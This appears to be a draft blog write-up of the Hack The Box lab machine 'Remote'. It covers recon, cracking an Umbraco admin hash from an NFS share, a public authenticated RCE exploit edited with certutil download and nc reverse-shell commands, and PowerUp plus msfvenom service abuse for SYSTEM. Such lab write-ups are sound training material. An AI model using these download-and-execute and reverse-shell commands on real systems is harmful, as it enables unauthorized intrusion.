+++
draft = true
date = 2020-07-22T16:04:02+01:00
title = "Remote"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 11
+++


# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.180


# Mind Map
![Remote_MindMap](/images/htb/remote_mindmap.png)


# Reconnaisance

First I run the usual initial scan:

{{< highlight html >}}
sudo nmap -n 10.10.10.180 -sV

Nmap scan report for 10.10.10.180
Host is up (0.076s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

{{< /highlight >}}

# Enumeration

From the scan results I can see that the FTP service is accessible with anonymous credentials. The login is successful with the `anonymous : anonymous` credentials but probably due to read permission we are not able to list anything useful.

There is an interesting service running on port **2049**. The `mountd` daemon is a Remote Procedure Call (RPC) that answers a client request to mount a file system. So probably there is a share available to mount. Let's check for that information:

{{< highlight html >}}
sudo showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
{{< /highlight >}}

Mounting the available share:

{{< highlight html >}}
sudo mkdir -p /tmp/site_backups
sudo mount -t nfs 10.10.10.180:/site_backups /tmp/site_backups
{{< /highlight >}}

Apparently the share hosts all the files from the web server listening at port 80. Visiting the page in a browser we are presented with a web page built on a CMS named **Umbraco**.

![Umbraco_80](/images/htb/Umbraco_80.png)

**Note**: Brute Forcing the directories on the web server appears to be useless as nothing useful shows up.

I proceed enumerating the share. Googling the service there are different resources telling that login informations are usually stored under the **App_Data** folder. Visiting that folder I can see an interesting file called **Umbraco.sdf**.

What are .sdf files?

> An SDF file contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft. It is designed for applications that run on mobile devices and desktops and contains the complete database contents, which may be up to 4GB in size.

As I am searching for admin login informations:

{{< highlight html >}}
strings Umbraco.sdf | grep admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
{{< /highlight >}}

**->** **b8be16afba8c314ad33d812f22a04991b90e2aaa** is the password hash for the **admin[at]htb.local** user!

Cracking the hash:

{{< highlight html >}}
john hash --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt
{{< /highlight >}}

Where:
- hash is a file containing the actual password hash

The password is `beaconandcheese`!

At this point, to complete the enumeration phase it is important to identify the CMS version in order to be able to check for potential vulnerabilities affecting this particular version. The version is **7.12.4**, as stated in the `Web.config file`.

Searching on `searchsploit` for related vulns, I found this one:

{{< highlight html >}}
searchsploit Umbraco 7.12.4
-------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                              |  Path
-------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                  | aspx/webapps/46153.py
-------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

{{< /highlight >}}

# Exploitation

The script is a **Remote Code execution script** and it needs a valid `Admin` authentication in order to function (I have admin credentials). It only needs some edits.
I will first upload the netcat program `nc.exe` from my machine and then set up a netcat reverse shell.

First I have to edit the following lines:

{{< highlight html >}}
login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";
{{< /highlight >}}

And edit the payload section with a custom command cmd (which will upload nc.exe in C:\Windows\Temp):

{{< highlight html >}}
{ string cmd = "/c certutil -urlcache -split -f http://10.10.14:12:80/nc.exe c:/Windows/Temp/nc.exe";
{{< /highlight >}}

**Note**: I have to set up a Python Server and serve the nc.exe file from my machine.

Now that the `nc` program is on the target machine, I can launch a reverse shell. I will edit the python script a second time and change the command cmd as follows:

{{< highlight html >}}
{ string cmd = "/c C:/Windows/Temp/nc.exe 10.10.14.12 4321 -e cmd.exe";
{{< /highlight >}}

Running the script after having launched a netcat listener on port 4321, I can see the connection coming back:

{{< highlight html >}}
nc -nlvp 4321
listening on [any] 4321 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49703
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
{{< /highlight >}}

**->** I am successfully logged in as **iis apppool\defaultapppool**!


# Privilege Escalation


For the PrivEsc phase I will rely on the PowerUp script.

>PowerUp is a PowerShell tool to assist with local privilege escalation on Windows systems. It contains several methods to identify and abuse vulnerable services, as well as DLL hijacking opportunities, vulnerable registry settings, and escalation opportunities.

I will serve the script from my machine and execute it from a PowerShell command line:

{{< highlight html >}}
PS C:\windows\system32\inetsrv> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12:8080/PowerUp.ps1')

PS C:\windows\system32\inetsrv> Invoke-AllChecks
Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


ServiceName                     : UsoSvc
Path                            : c:\windows\temp\rev.exe
ModifiableFile                  : C:\windows\temp\rev.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : IIS APPPOOL\DefaultAppPool
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'UsoSvc'
CanRestart                      : True

{{< /highlight >}}

The current user is able to stop and restart the **UsoSvc** service. The serivce is running as Local System! I can leverage this misconfiguration in order to execute a command of my choice and have it executed with highest privileges.

I create a reverse shell with msfvenom and upload it on the target machine under C:\Windows\Temp:

{{< highlight html >}}
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe --platform windows > rev.exe
{{< /highlight >}}

I just have to launch the AbuseFunction after having set up the nc listener on port 4444:

{{< highlight html >}}
Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\Windows\Temp\rev.exe 10.10.14.12 4444 -e cmd.exe"
{{< /highlight >}}

Here is the root shell:

{{< highlight html >}}
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49708
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
{{< /highlight >}}


## Lessons learned and remediations

- The webserver Administrator should not have exposed a mount share publicly. It was the first step which made possible to identify admin credentials for the application. Only expose what is striclty necessary!
- A low privilged user was able to manipulate a process running as Local System. This is a security misconfiguration and should be fixed as soon as possible. 
